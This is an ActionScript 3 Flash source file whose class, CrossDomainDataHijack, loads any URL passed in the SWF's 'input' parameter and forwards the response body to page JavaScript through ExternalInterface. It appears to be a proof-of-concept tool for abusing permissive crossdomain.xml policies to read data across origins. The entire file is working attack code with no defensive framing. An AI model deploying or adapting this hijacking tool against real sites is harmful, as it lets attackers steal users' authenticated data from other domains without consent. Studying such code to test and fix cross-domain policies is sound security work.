package com.powerflasher.SampleApp {
	import flash.external.ExternalInterface;

	import flash.display.Sprite;
	import flash.display.Sprite;
    import flash.events.Event;
    import flash.net.URLLoader;
    import flash.net.URLRequest;
    import flash.text.TextField;
    import flash.text.TextFieldAutoSize;
    import flash.xml.*;
    import flash.events.IOErrorEvent;
	import flash.events.*;
    import flash.net.*;
	/**
	 * @author User
	 */

	

 	public class CrossDomainDataHijack extends Sprite {
        
        private var loader:URLLoader;
        public function CrossDomainDataHijack() {
            loader = new URLLoader();
            configureListeners(loader);
			var target:String = root.loaderInfo.parameters.input;
			


            var request:URLRequest = new URLRequest(target);
            try {
                loader.load(request);
            } catch (error:Error) {
                sendDatatoJS("Unable to load requested document; Error: " + error.getStackTrace());
            }
        }

        private function configureListeners(dispatcher:IEventDispatcher):void {
            dispatcher.addEventListener(Event.COMPLETE, completeHandler);
            dispatcher.addEventListener(Event.OPEN, openHandler);
            dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);
            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);
            dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);
            dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);
        }

        private function completeHandler(event:Event):void {
            var loader:URLLoader = URLLoader(event.target);
            //trace("completeHandler: " + loader.data);
    		sendDatatoJS("completeHandler: " + loader.data);
        }

        private function openHandler(event:Event):void {
            //trace("openHandler: " + event);
			sendDatatoJS("openHandler: " + event);
        }

        private function progressHandler(event:ProgressEvent):void {
            //trace("progressHandler loaded:" + event.bytesLoaded + " total: " + event.bytesTotal);
			sendDatatoJS("progressHandler loaded:" + event.bytesLoaded + " total: " + event.bytesTotal);
        }

        private function securityErrorHandler(event:SecurityErrorEvent):void {
            //trace("securityErrorHandler: " + event);
			sendDatatoJS("securityErrorHandler: " + event);
        }

        private function httpStatusHandler(event:HTTPStatusEvent):void {
            //trace("httpStatusHandler: " + event);
			sendDatatoJS("httpStatusHandler: " + event);
        }

        private function ioErrorHandler(event:IOErrorEvent):void {
            //trace("ioErrorHandler: " + event);
			sendDatatoJS("ioErrorHandler: " + event);
        }
		
		private function sendDatatoJS(data:String):void{
            trace(data);
			ExternalInterface.call("sendToJavaScript", data);
		}
    }
	
	
}